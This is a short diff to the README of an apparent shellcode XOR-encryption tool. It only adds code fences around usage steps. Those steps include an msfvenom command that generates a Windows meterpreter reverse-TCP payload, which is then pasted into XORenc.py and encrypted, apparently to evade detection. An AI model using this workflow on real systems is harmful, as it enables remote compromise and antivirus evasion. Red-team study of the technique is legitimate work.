@@ -7,8 +7,9 @@ Features:
 Usage Example
 
 1️⃣ Generate Shellcode (C# Format)
-
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f csharp
+```
 
 2️⃣ Copy Shellcode
 
@@ -16,8 +17,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port
     Paste it into buf in XORenc.py.
 
 3️⃣ Run the Encryption Script
-
+```bash
 python3 XORenc.py
+```
 
 4️⃣ Copy the XOR Key & Encrypted Shellcode
 
